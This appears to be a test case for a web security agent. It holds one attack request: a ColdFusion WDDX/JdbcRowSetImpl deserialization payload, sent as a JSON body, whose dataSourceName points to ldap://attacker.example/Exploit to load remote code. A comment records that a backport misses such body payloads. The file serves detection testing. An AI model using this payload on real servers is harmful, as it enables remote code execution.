[[case]]
name = "wddx-rowset-jndi-in-json-body"
kind = "attack"
via = "request"

[case.request]
method = "POST"
uri = "/CFIDE/adminapi/accessmanager.cfc"
headers = { "User-Agent" = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html", "Content-Type" = "application/json" }
body = "{\"method\":\"foo\",\"_cfclient\":\"true\",\"argumentCollection\":\"<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://attacker.example/Exploit</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>\"}"
body_api = "stream"

[case.primary]
effect = "block"
rule = "request_typed_payload_deserialization"

[case.backport]
effect = "none"
why = "the same input blocks as a query parameter but passes as a JSON body: the agent's request context has no body (no hook reads the input stream or the reader), so body fields are never read"
